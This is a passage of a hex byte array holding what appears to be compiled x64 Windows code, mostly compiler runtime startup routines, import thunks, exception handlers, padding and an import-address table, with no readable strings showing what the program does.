0xC1, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF, 0x00, 0x00, 0x48, 0x23, 0xC1, 0x48, 0xB9, 0x33, 0xA2, 0xDF,	0x2D, 0x99, 0x2B, 0x00, 0x00, 0x48, 0x3B, 0xC3, 0x48, 0x0F, 0x44, 0xC1,	0x48, 0x89, 0x05, 0xDD, 0x39, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x48,	0x48, 0xF7, 0xD0, 0x48, 0x89, 0x05, 0xC6, 0x39, 0x00, 0x00, 0x48, 0x83,	0xC4, 0x20, 0x5D, 0xC3, 0x48, 0x8D, 0x0D, 0x51, 0x42, 0x00, 0x00, 0x48,	0xFF, 0x25, 0x42, 0x0A, 0x00, 0x00, 0xCC, 0xCC, 0x48, 0x8D, 0x0D, 0x41,	0x42, 0x00, 0x00, 0xE9, 0xD4, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x45,	0x42, 0x00, 0x00, 0xC3, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x9B, 0xC9, 0xFF,	0xFF, 0x48, 0x83, 0x08, 0x24, 0xE8, 0xE6, 0xFF, 0xFF, 0xFF, 0x48, 0x83,	0x08, 0x02, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0x48, 0x8D, 0x05, 0x89,	0x43, 0x00, 0x00, 0xC3, 0x83, 0x25, 0x21, 0x42, 0x00, 0x00, 0x00, 0xC3,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x48, 0x8D, 0xAC, 0x24, 0x40, 0xFB,	0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xC0, 0x05, 0x00, 0x00, 0x8B, 0xD9, 0xB9,	0x17, 0x00, 0x00, 0x00, 0xE8, 0xD9, 0x03, 0x00, 0x00, 0x85, 0xC0, 0x74,	0x04, 0x8B, 0xCB, 0xCD, 0x29, 0xB9, 0x03, 0x00, 0x00, 0x00, 0xE8, 0xC5,	0xFF, 0xFF, 0xFF, 0x33, 0xD2, 0x48, 0x8D, 0x4D, 0xF0, 0x41, 0xB8, 0xD0,	0x04, 0x00, 0x00, 0xE8, 0x62, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xF0,	0xFF, 0x15, 0xC2, 0x09, 0x00, 0x00, 0x48, 0x8B, 0x9D, 0xE8, 0x00, 0x00,	0x00, 0x48, 0x8D, 0x95, 0xD8, 0x04, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x45,	0x33, 0xC0, 0xFF, 0x15, 0x28, 0x09, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,	0x3C, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x48, 0x8D, 0x8D, 0xE0, 0x04,	0x00, 0x00, 0x48, 0x8B, 0x95, 0xD8, 0x04, 0x00, 0x00, 0x4C, 0x8B, 0xC8,	0x48, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, 0x8D, 0xE8,	0x04, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x28, 0x48, 0x8D, 0x4D, 0xF0,	0x48, 0x89, 0x4C, 0x24, 0x20, 0x33, 0xC9, 0xFF, 0x15, 0x17, 0x09, 0x00,	0x00, 0x48, 0x8B, 0x85, 0xC8, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,	0x50, 0x48, 0x89, 0x85, 0xE8, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8D,	0x85, 0xC8, 0x04, 0x00, 0x00, 0x41, 0xB8, 0x98, 0x00, 0x00, 0x00, 0x48,	0x83, 0xC0, 0x08, 0x48, 0x89, 0x85, 0x88, 0x00, 0x00, 0x00, 0xE8, 0xCB,	0x02, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xC8, 0x04, 0x00, 0x00, 0x48, 0x89,	0x44, 0x24, 0x60, 0xC7, 0x44, 0x24, 0x50, 0x15, 0x00, 0x00, 0x40, 0xC7,	0x44, 0x24, 0x54, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x0B, 0x09, 0x00,	0x00, 0x83, 0xF8, 0x01, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44,	0x24, 0x40, 0x48, 0x8D, 0x45, 0xF0, 0x0F, 0x94, 0xC3, 0x48, 0x89, 0x44,	0x24, 0x48, 0x33, 0xC9, 0xFF, 0x15, 0xB2, 0x08, 0x00, 0x00, 0x48, 0x8D,	0x4C, 0x24, 0x40, 0xFF, 0x15, 0x9F, 0x08, 0x00, 0x00, 0x85, 0xC0, 0x75,	0x0C, 0x84, 0xDB, 0x75, 0x08, 0x8D, 0x48, 0x03, 0xE8, 0xBF, 0xFE, 0xFF,	0xFF, 0x48, 0x8B, 0x9C, 0x24, 0xD0, 0x05, 0x00, 0x00, 0x48, 0x81, 0xC4,	0xC0, 0x05, 0x00, 0x00, 0x5D, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24,	0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x1D, 0x2B, 0x19, 0x00,	0x00, 0x48, 0x8D, 0x3D, 0x24, 0x19, 0x00, 0x00, 0xEB, 0x12, 0x48, 0x8B,	0x03, 0x48, 0x85, 0xC0, 0x74, 0x06, 0xFF, 0x15, 0x44, 0x0B, 0x00, 0x00,	0x48, 0x83, 0xC3, 0x08, 0x48, 0x3B, 0xDF, 0x72, 0xE9, 0x48, 0x8B, 0x5C,	0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24,	0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x1D, 0xFF, 0x18, 0x00,	0x00, 0x48, 0x8D, 0x3D, 0xF8, 0x18, 0x00, 0x00, 0xEB, 0x12, 0x48, 0x8B,	0x03, 0x48, 0x85, 0xC0, 0x74, 0x06, 0xFF, 0x15, 0x08, 0x0B, 0x00, 0x00,	0x48, 0x83, 0xC3, 0x08, 0x48, 0x3B, 0xDF, 0x72, 0xE9, 0x48, 0x8B, 0x5C,	0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24,	0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x33,	0xC0, 0x33, 0xC9, 0x0F, 0xA2, 0x44, 0x8B, 0xC1, 0x45, 0x33, 0xDB, 0x44,	0x8B, 0xCB, 0x41, 0x81, 0xF0, 0x6E, 0x74, 0x65, 0x6C, 0x41, 0x81, 0xF1,	0x47, 0x65, 0x6E, 0x75, 0x44, 0x8B, 0xD2, 0x8B, 0xF0, 0x33, 0xC9, 0x41,	0x8D, 0x43, 0x01, 0x45, 0x0B, 0xC8, 0x0F, 0xA2, 0x41, 0x81, 0xF2, 0x69,	0x6E, 0x65, 0x49, 0x89, 0x04, 0x24, 0x45, 0x0B, 0xCA, 0x89, 0x5C, 0x24,	0x04, 0x8B, 0xF9, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54, 0x24, 0x0C, 0x75,	0x50, 0x48, 0x83, 0x0D, 0x63, 0x37, 0x00, 0x00, 0xFF, 0x25, 0xF0, 0x3F,	0xFF, 0x0F, 0x3D, 0xC0, 0x06, 0x01, 0x00, 0x74, 0x28, 0x3D, 0x60, 0x06,	0x02, 0x00, 0x74, 0x21, 0x3D, 0x70, 0x06, 0x02, 0x00, 0x74, 0x1A, 0x05,	0xB0, 0xF9, 0xFC, 0xFF, 0x83, 0xF8, 0x20, 0x77, 0x24, 0x48, 0xB9, 0x01,	0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x0F, 0xA3, 0xC1, 0x73,	0x14, 0x44, 0x8B, 0x05, 0xC4, 0x3F, 0x00, 0x00, 0x41, 0x83, 0xC8, 0x01,	0x44, 0x89, 0x05, 0xB9, 0x3F, 0x00, 0x00, 0xEB, 0x07, 0x44, 0x8B, 0x05,	0xB0, 0x3F, 0x00, 0x00, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x48,	0xFB, 0x3B, 0xF0, 0x7C, 0x26, 0x33, 0xC9, 0x0F, 0xA2, 0x89, 0x04, 0x24,	0x44, 0x8B, 0xDB, 0x89, 0x5C, 0x24, 0x04, 0x89, 0x4C, 0x24, 0x08, 0x89,	0x54, 0x24, 0x0C, 0x0F, 0xBA, 0xE3, 0x09, 0x73, 0x0A, 0x45, 0x0B, 0xC1,	0x44, 0x89, 0x05, 0x7D, 0x3F, 0x00, 0x00, 0xC7, 0x05, 0xCF, 0x36, 0x00,	0x00, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x0D, 0xCC, 0x36, 0x00, 0x00,	0x0F, 0xBA, 0xE7, 0x14, 0x0F, 0x83, 0x91, 0x00, 0x00, 0x00, 0x44, 0x89,	0x0D, 0xB7, 0x36, 0x00, 0x00, 0xBB, 0x06, 0x00, 0x00, 0x00, 0x89, 0x1D,	0xB0, 0x36, 0x00, 0x00, 0x0F, 0xBA, 0xE7, 0x1B, 0x73, 0x79, 0x0F, 0xBA,	0xE7, 0x1C, 0x73, 0x73, 0x33, 0xC9, 0x0F, 0x01, 0xD0, 0x48, 0xC1, 0xE2,	0x20, 0x48, 0x0B, 0xD0, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8B, 0x44,	0x24, 0x20, 0x22, 0xC3, 0x3A, 0xC3, 0x75, 0x57, 0x8B, 0x05, 0x82, 0x36,	0x00, 0x00, 0x83, 0xC8, 0x08, 0xC7, 0x05, 0x71, 0x36, 0x00, 0x00, 0x03,	0x00, 0x00, 0x00, 0x89, 0x05, 0x6F, 0x36, 0x00, 0x00, 0x41, 0xF6, 0xC3,	0x20, 0x74, 0x38, 0x83, 0xC8, 0x20, 0xC7, 0x05, 0x58, 0x36, 0x00, 0x00,	0x05, 0x00, 0x00, 0x00, 0x89, 0x05, 0x56, 0x36, 0x00, 0x00, 0xB8, 0x00,	0x00, 0x03, 0xD0, 0x44, 0x23, 0xD8, 0x44, 0x3B, 0xD8, 0x75, 0x18, 0x48,	0x8B, 0x44, 0x24, 0x20, 0x24, 0xE0, 0x3C, 0xE0, 0x75, 0x0D, 0x83, 0x0D,	0x37, 0x36, 0x00, 0x00, 0x40, 0x89, 0x1D, 0x2D, 0x36, 0x00, 0x00, 0x48,	0x8B, 0x5C, 0x24, 0x28, 0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48,	0x83, 0xC4, 0x10, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xB8, 0x01, 0x00, 0x00,	0x00, 0xC3, 0xCC, 0xCC, 0x33, 0xC0, 0x39, 0x05, 0x20, 0x36, 0x00, 0x00,	0x0F, 0x95, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x25, 0xE2, 0x07, 0x00, 0x00, 0xFF, 0x25,	0xB4, 0x07, 0x00, 0x00, 0xFF, 0x25, 0xBE, 0x07, 0x00, 0x00, 0xFF, 0x25,	0x88, 0x07, 0x00, 0x00, 0xFF, 0x25, 0x7A, 0x07, 0x00, 0x00, 0xFF, 0x25,	0x84, 0x07, 0x00, 0x00, 0xFF, 0x25, 0xF6, 0x07, 0x00, 0x00, 0xFF, 0x25,	0xE0, 0x07, 0x00, 0x00, 0xFF, 0x25, 0x3A, 0x08, 0x00, 0x00, 0xFF, 0x25,	0x14, 0x08, 0x00, 0x00, 0xFF, 0x25, 0xEE, 0x07, 0x00, 0x00, 0xFF, 0x25,	0xF0, 0x07, 0x00, 0x00, 0xFF, 0x25, 0xF2, 0x07, 0x00, 0x00, 0xFF, 0x25,	0xF4, 0x07, 0x00, 0x00, 0xFF, 0x25, 0x26, 0x08, 0x00, 0x00, 0xFF, 0x25,	0xF8, 0x07, 0x00, 0x00, 0xFF, 0x25, 0xFA, 0x07, 0x00, 0x00, 0xFF, 0x25,	0xFC, 0x07, 0x00, 0x00, 0xFF, 0x25, 0xA6, 0x07, 0x00, 0x00, 0xFF, 0x25,	0xE0, 0x05, 0x00, 0x00, 0xB0, 0x01, 0xC3, 0xCC, 0x33, 0xC0, 0xC3, 0xCC,	0x48, 0x83, 0xEC, 0x28, 0x4D, 0x8B, 0x41, 0x38, 0x48, 0x8B, 0xCA, 0x49,	0x8B, 0xD1, 0xE8, 0x0D, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00,	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x45, 0x8B,	0x18, 0x48, 0x8B, 0xDA, 0x41, 0x83, 0xE3, 0xF8, 0x4C, 0x8B, 0xC9, 0x41,	0xF6, 0x00, 0x04, 0x4C, 0x8B, 0xD1, 0x74, 0x13, 0x41, 0x8B, 0x40, 0x08,	0x4D, 0x63, 0x50, 0x04, 0xF7, 0xD8, 0x4C, 0x03, 0xD1, 0x48, 0x63, 0xC8,	0x4C, 0x23, 0xD1, 0x49, 0x63, 0xC3, 0x4A, 0x8B, 0x14, 0x10, 0x48, 0x8B,	0x43, 0x10, 0x8B, 0x48, 0x08, 0x48, 0x8B, 0x43, 0x08, 0xF6, 0x44, 0x01,	0x03, 0x0F, 0x74, 0x0B, 0x0F, 0xB6, 0x44, 0x01, 0x03, 0x83, 0xE0, 0xF0,	0x4C, 0x03, 0xC8, 0x4C, 0x33, 0xCA, 0x49, 0x8B, 0xC9, 0x5B, 0xE9, 0x45,	0xF1, 0xFF, 0xFF, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,	0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41,	0x56, 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0x59, 0x38, 0x48, 0x8B, 0xF2,	0x4D, 0x8B, 0xF0, 0x48, 0x8B, 0xE9, 0x49, 0x8B, 0xD1, 0x48, 0x8B, 0xCE,	0x49, 0x8B, 0xF9, 0x4C, 0x8D, 0x43, 0x04, 0xE8, 0x6C, 0xFF, 0xFF, 0xFF,	0x8B, 0x45, 0x04, 0x24, 0x66, 0xF6, 0xD8, 0xB8, 0x01, 0x00, 0x00, 0x00,	0x45, 0x1B, 0xC0, 0x41, 0xF7, 0xD8, 0x44, 0x03, 0xC0, 0x44, 0x85, 0x43,	0x04, 0x74, 0x11, 0x4C, 0x8B, 0xCF, 0x4D, 0x8B, 0xC6, 0x48, 0x8B, 0xD6,	0x48, 0x8B, 0xCD, 0xE8, 0xA0, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24,	0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48,	0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3, 0xFF,	0x25, 0x57, 0x06, 0x00, 0x00, 0xFF, 0x25, 0x41, 0x06, 0x00, 0x00, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66,	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x25, 0x6A, 0x07,	0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0x8B, 0x85, 0xA0,	0x00, 0x00, 0x00, 0x83, 0xE0, 0x01, 0x85, 0xC0, 0x74, 0x1B, 0x83, 0xA5,	0xA0, 0x00, 0x00, 0x00, 0xFE, 0x48, 0x8D, 0x8D, 0x10, 0x01, 0x00, 0x00,	0x48, 0x81, 0xC1, 0xA8, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x1F, 0x05, 0x00,	0x00, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0x48, 0x8D, 0x8A, 0x10, 0x01,	0x00, 0x00, 0x48, 0x83, 0xC1, 0x10, 0x48, 0xFF, 0x25, 0x0F, 0x05, 0x00,	0x00, 0x48, 0x8B, 0x8A, 0x80, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x25, 0xD9,	0x04, 0x00, 0x00, 0x48, 0x8D, 0x8A, 0x10, 0x01, 0x00, 0x00, 0xE9, 0x6D,	0xD2, 0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0xA8, 0x00, 0x00, 0x00, 0xE9, 0xB1,	0xE0, 0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0xE8, 0x00, 0x00, 0x00, 0xE9, 0xA5,	0xE0, 0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0xC8, 0x00, 0x00, 0x00, 0xE9, 0x99,	0xE0, 0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0x60, 0x00, 0x00, 0x00, 0xE9, 0x8D,	0xE0, 0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0x40, 0x00, 0x00, 0x00, 0xE9, 0x81,	0xE0, 0xFF, 0xFF, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA,	0x8B, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x83, 0xE0, 0x20, 0x85, 0xC0, 0x74,	0x10, 0x83, 0xA5, 0xA0, 0x00, 0x00, 0x00, 0xDF, 0x48, 0x8D, 0x4D, 0x60,	0xE8, 0x5B, 0xE0, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0x48,	0x8D, 0x8A, 0x40, 0x00, 0x00, 0x00, 0xE9, 0x49, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x20, 0x02, 0x00, 0x00, 0xE9, 0x3D, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x60, 0x00, 0x00, 0x00, 0xE9, 0x31, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x40, 0x00, 0x00, 0x00, 0xE9, 0x25, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x80, 0x00, 0x00, 0x00, 0xE9, 0x19, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x60, 0x00, 0x00, 0x00, 0xE9, 0x0D, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x40, 0x00, 0x00, 0x00, 0xE9, 0x01, 0xE0, 0xFF, 0xFF, 0x48,	0x8D, 0x8A, 0x20, 0x02, 0x00, 0x00, 0xE9, 0xF5, 0xDF, 0xFF, 0xFF, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x8A, 0x58, 0x00, 0x00, 0x00, 0xE9,	0xE4, 0xDF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x8A, 0x20,	0x00, 0x00, 0x00, 0xE9, 0x94, 0xC5, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x8D, 0x8A, 0x20, 0x00, 0x00, 0x00, 0xE9, 0x54, 0xEA, 0xFF, 0xFF,	0x48, 0x8D, 0x8A, 0x20, 0x00, 0x00, 0x00, 0xE9, 0xE8, 0xE9, 0xFF, 0xFF,	0x48, 0x89, 0x54, 0x24, 0x10, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,	0xEA, 0x48, 0x8B, 0x55, 0x50, 0x48, 0x8B, 0x02, 0x48, 0x63, 0x48, 0x04,	0x48, 0x03, 0xCA, 0x41, 0xB0, 0x01, 0xBA, 0x04, 0x00, 0x00, 0x00, 0xFF,	0x15, 0x87, 0x03, 0x00, 0x00, 0x90, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x8D, 0x8A, 0x28, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x25, 0xC2, 0x03,	0x00, 0x00, 0x48, 0x8D, 0x8A, 0x30, 0x00, 0x00, 0x00, 0xE9, 0xC6, 0xE9,	0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x8A, 0x20,	0x00, 0x00, 0x00, 0xE9, 0xD4, 0xE9, 0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0x20,	0x00, 0x00, 0x00, 0xE9, 0x68, 0xE9, 0xFF, 0xFF, 0x48, 0x89, 0x54, 0x24,	0x10, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0x55,	0x60, 0x48, 0x8B, 0x02, 0x48, 0x63, 0x48, 0x04, 0x48, 0x03, 0xCA, 0x41,	0xB0, 0x01, 0xBA, 0x04, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x07, 0x03, 0x00,	0x00, 0x90, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC,	0x20, 0x48, 0x8B, 0xEA, 0x8A, 0x4D, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5D,	0xE9, 0x07, 0xF5, 0xFF, 0xFF, 0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x20,	0x48, 0x8B, 0xEA, 0x8A, 0x4D, 0x20, 0xE8, 0xF5, 0xF4, 0xFF, 0xFF, 0x90,	0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC,	0x20, 0x48, 0x8B, 0xEA, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xE9, 0x56, 0xF3,	0xFF, 0xFF, 0xCC, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xEA,	0x48, 0x8B, 0x01, 0x8B, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x28, 0x89, 0x54,	0x24, 0x20, 0x4C, 0x8D, 0x0D, 0x7F, 0xEE, 0xFF, 0xFF, 0x4C, 0x8B, 0x45,	0x70, 0x8B, 0x55, 0x68, 0x48, 0x8B, 0x4D, 0x60, 0xE8, 0x97, 0xF2, 0xFF,	0xFF, 0x90, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0xC3, 0xCC, 0x40, 0x55, 0x48,	0x8B, 0xEA, 0x48, 0x8B, 0x01, 0x33, 0xC9, 0x81, 0x38, 0x05, 0x00, 0x00,	0xC0, 0x0F, 0x94, 0xC1, 0x8B, 0xC1, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xEB, 0x41, 0x48, 0x8B, 0x03, 0x48,	0x8B, 0x4B, 0x08, 0x48, 0x89, 0x05, 0x12, 0x34, 0x00, 0x00, 0x48, 0x8B,	0x01, 0x48, 0x8B, 0x40, 0x10, 0xFF, 0x15, 0x85, 0x04, 0x00, 0x00, 0x48,	0x8B, 0xC8, 0x48, 0x85, 0xC0, 0x74, 0x11, 0x48, 0x8B, 0x10, 0x48, 0x8B,	0x02, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x6C, 0x04, 0x00, 0x00,	0xBA, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0x93, 0xED, 0xFF,	0xFF, 0x48, 0x8B, 0x1D, 0xD8, 0x33, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x75,	0xB3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xBA, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xE4, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x74, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xF6, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x46, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x96, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x38, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x10, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x7A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x40, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x5E, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x7A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x8E, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xA8, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x7A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xD8, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xEE, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x79, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x26, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x71, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xB4, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x72, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x7C, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xBA, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x73, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xDE, 0x70, 0x00, 0x00, 0x00, 